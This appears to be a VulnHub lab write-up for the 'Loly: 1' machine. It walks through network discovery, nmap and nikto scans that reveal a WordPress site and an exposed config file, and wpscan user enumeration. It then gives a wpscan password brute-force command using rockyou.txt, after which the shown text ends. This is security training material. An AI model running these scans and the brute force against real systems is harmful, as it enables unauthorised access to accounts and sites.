![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/bfeaf4da-2536-4bb4-9a13-9810436e2aff)# Loly: 1

### 1.Get VM IP

```bash
root@kali: arp-scan -I eth1 -l   
Interface: eth1, type: EN10MB, MAC: 00:0c:29:3a:bc:b3, IPv4: 192.168.127.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1	00:50:56:c0:00:01	VMware, Inc.
192.168.127.135	00:0c:29:0f:25:d7	VMware, Inc.
192.168.127.254	00:50:56:ea:34:a1	VMware, Inc.
```

The ip address is `192.168.127.135`, let's enumerate it

### 2.Enumeration

```bash
root@kali: -sT -sV -sC -p- -oN nmap.out 192.168.127.135
Nmap scan report for 192.168.127.135
Host is up (0.00036s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 (Ubuntu)
MAC Address: 00:0C:29:0F:25:D7 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

so we just need to check port 80, using nikto it reveals that the site has wordpress CMS :

```bash
root@kali: nikto -h 192.168.127.135
+ /wordpress/wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version.
+ /wordpress/wp-links-opml.php: This WordPress script reveals the installed version.
+ /wordpress/wp-admin/: Uncommon header 'x-redirect-by' found, with contents: WordPress.
+ /wordpress/: Drupal Link header found with value: <http://loly.lc/wordpress/index.php?rest_route=/>; rel="https://api.w.org/". See: https://www.drupal.org/
+ /wordpress/: A Wordpress installation was found.
+ /wordpress/wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wordpress/wp-login.php: Wordpress login found.
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ /wordpress/#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 8102 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2024-05-06 04:35:09 (GMT-4) (18 seconds)
```

we need to scan the wordpress site using `wpscan` :

```bash
root@kali: wpscan --url http://192.168.127.135/wordpress/ -e u,ap
```

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/f4a42583-023c-4d66-ac55-9243f6b5c983)

yes we found a user, let's brute force this user :

```bash
root@kali: wpscan --url http://192.168.127.135/wordpress/ -e u,ap -U users.txt -P /usr/share/wordlists/rockyou.txt
```

![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/1d1936e5-c66d-4d86-8f3b-542c210f700a)















